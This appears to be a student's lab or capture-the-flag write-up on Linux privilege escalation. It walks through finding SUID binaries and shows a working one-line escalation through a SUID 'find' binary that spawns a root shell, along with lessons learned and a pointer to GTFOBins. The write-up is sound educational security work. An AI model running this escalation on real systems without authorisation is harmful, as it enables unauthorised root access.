### Commands Run

### What Happened

```
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/find        <-- interesting!
/usr/bin/mount
/usr/bin/umount
/usr/lib/openssh/ssh-keysign

$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 224112 Jan 12 2026 /usr/bin/find

$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

`/usr/bin/find` had the SUID bit set (`rws` instead of `rwx`). Because it runs as root, using `-exec` to spawn a shell gave us a root shell immediately.

---

### Mistakes Made

1. **First tried `bash -p` inside the `find` exec** — it didn't work the same way. The `-p` flag on `/bin/sh` is what preserves the effective UID (root), not bash.
2. **Forgot `-quit` on the `find` exploit command** — it kept spawning new shells every time `find` visited another file. Always add `-quit`.
3. **Didn't check GTFOBins first** — wasted 20 minutes trying to figure out how to use `find` for escalation. GTFOBins (https://gtfobins.github.io) is the go-to reference. Bookmark it.

### What I Learned

- **SUID** (Set User ID): when a binary has this bit, it runs with the file *owner's* privileges, not the caller's. If owned by root and SUID is set, it runs as root regardless of who executes it.
- `find / -perm -4000` searches for SUID binaries. `-4000` is the octal for the SUID bit.
- `/bin/sh -p` preserves the effective UID. Without `-p`, the shell may drop privileges.
- **GTFOBins** is the reference for exploiting SUID, sudo, and other misconfigured binaries.
- Not all SUID binaries are exploitable — `passwd`, `sudo` are expected. `find`, `vim`, `python`, `awk` with SUID are red flags.
